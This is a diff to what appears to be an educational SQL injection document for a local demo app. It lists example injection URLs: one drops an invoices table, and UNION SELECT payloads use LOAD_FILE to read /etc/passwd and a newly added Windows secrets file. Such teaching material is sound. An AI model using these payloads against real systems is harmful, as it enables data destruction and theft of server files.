@@ -27,7 +27,8 @@ In an SQL injection attack, malicious SQL statements are inserted into an entry 
 * Drop (destroy) invoices table: 
     - `http://localhost/index.php?id=1;drop%20table%20invoices`
 * Dump the password hash file from the server: 
-    - `http://localhost/index.php?username='%20UNION%20SELECT%201,1,1,1,LOAD_FILE('/etc/passwd'),'1`
+    - Unix: `http://localhost/index.php?username='%20UNION%20SELECT%201,1,1,1,LOAD_FILE('/etc/passwd'),'1`
+    - Windows: `http://localhost/index.php?username='%20UNION%20SELECT%201,1,1,1,LOAD_FILE('C:\\secrets.txt'),'1`
 * Dump several things at once (oh boy): 
     - `http://localhost/index.php?username='%20UNION%20SELECT%201,2,3,4,5,'hello%20world`
 
